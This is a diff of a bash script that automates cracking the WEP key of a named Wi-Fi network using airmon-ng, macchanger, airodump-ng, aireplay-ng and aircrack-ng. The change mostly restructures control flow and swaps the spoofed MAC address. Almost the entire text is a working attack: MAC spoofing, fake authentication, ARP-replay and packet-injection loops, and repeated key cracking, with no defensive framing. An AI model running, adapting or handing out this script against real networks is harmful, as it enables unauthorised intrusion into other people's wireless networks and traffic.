@@ -43,48 +43,48 @@ function check_iface {
 
 if [ $# -lt 2 ]; then
 	print_help
-else
-
-	check_iface $1
-
-	# Interface configuration
-	airmon-ng stop mon0 # Stop mon0 in case it already exists
-	airmon-ng stop $1
-	airmon-ng start $1
-	ifconfig mon0 down
-	FAKE_MAC="00:11:22:33:44:55"
-	macchanger -m $FAKE_MAC mon0
-	ifconfig mon0 up
-
-	# Network data
-	ESSID="$2"
-
-	gnome-terminal -x sh -c "airodump-ng -t WEP -w airodump_data mon0" &
-	while [ "$essid_scanned" == "" ]; do
-		sleep 1
-		csv_file=$(ls -t | grep -e "airodump_data-[0-9]*\.kismet\.csv" | head -n 1)
-		echo "Looking at $csv_file for the ESSID..."
-		essid_scanned=$(cat $csv_file | grep $ESSID)
-	done
-	CH=$(echo "$essid_scanned" | tr ";" "$" | cut -d$ -f6)
-	BSSID=$(echo "$essid_scanned" | tr ";" "$" | cut -d$ -f4)
-
-	echo "Found $ESSID in channel $CH !"
-	echo "BSSID=$BSSID"
-
-	gnome-terminal -x sh -c "airodump-ng -t WEP -c $CH -w $ESSID --bssid $BSSID mon0" &
-
-	command0="aireplay-ng -1 6000 -q 10 -o 1 -e $ESSID -a $BSSID -h $FAKE_MAC mon0"
-	command1="aireplay-ng -1 6 -e $ESSID -a $BSSID -h $FAKE_MAC mon0"
-	command2="aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b $BSSID -h $FAKE_MAC -F mon0"
-	command3="aireplay-ng -3 -b $BSSID -h $FAKE_MAC mon0"
-	command4="aircrack-ng $ESSID*.cap"
-
-	gnome-terminal -x sh -c "while true;do $command0;done" &
-	gnome-terminal -x sh -c "while true;do $command2;done" &
-	gnome-terminal -x sh -c "while true;do $command3;done" &
-
-	sleep 30
-
-	gnome-terminal -x sh -c "while true;do $command4; echo Trying again...; sleep 1; done" &
+	exit
 fi
+
+check_iface $1
+
+# Interface configuration
+airmon-ng stop mon0 # Stop mon0 in case it already exists
+airmon-ng stop $1
+airmon-ng start $1
+ifconfig mon0 down
+FAKE_MAC="CC:AF:78:C5:C4:91"
+macchanger -m $FAKE_MAC mon0
+ifconfig mon0 up
+
+# Network data
+ESSID="$2"
+
+gnome-terminal -x sh -c "airodump-ng -t WEP -w airodump_data mon0" &
+while [ "$essid_scanned" == "" ]; do
+	sleep 1
+	csv_file=$(ls -t | grep -e "airodump_data-[0-9]*\.kismet\.csv" | head -n 1)
+	echo "Looking at $csv_file for the ESSID..."
+	essid_scanned=$(cat $csv_file | grep $ESSID)
+done
+CH=$(echo "$essid_scanned" | tr ";" "$" | cut -d$ -f6)
+BSSID=$(echo "$essid_scanned" | tr ";" "$" | cut -d$ -f4)
+
+echo "Found $ESSID in channel $CH !"
+echo "BSSID=$BSSID"
+
+gnome-terminal -x sh -c "airodump-ng -t WEP -c $CH -w $ESSID --bssid $BSSID mon0" &
+
+command0="aireplay-ng -1 6000 -q 10 -o 1 -e $ESSID -a $BSSID -h $FAKE_MAC mon0"
+command1="aireplay-ng -1 6 -e $ESSID -a $BSSID -h $FAKE_MAC mon0"
+command2="aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b $BSSID -h $FAKE_MAC -F mon0"
+command3="aireplay-ng -3 -b $BSSID -h $FAKE_MAC mon0"
+command4="aircrack-ng $ESSID*.cap"
+
+gnome-terminal -x sh -c "while true;do $command0;done" &
+gnome-terminal -x sh -c "while true;do $command2;done" &
+gnome-terminal -x sh -c "while true;do $command3;done" &
+
+sleep 30
+
+gnome-terminal -x sh -c "while true;do $command4; echo Trying again...; sleep 60; done" &
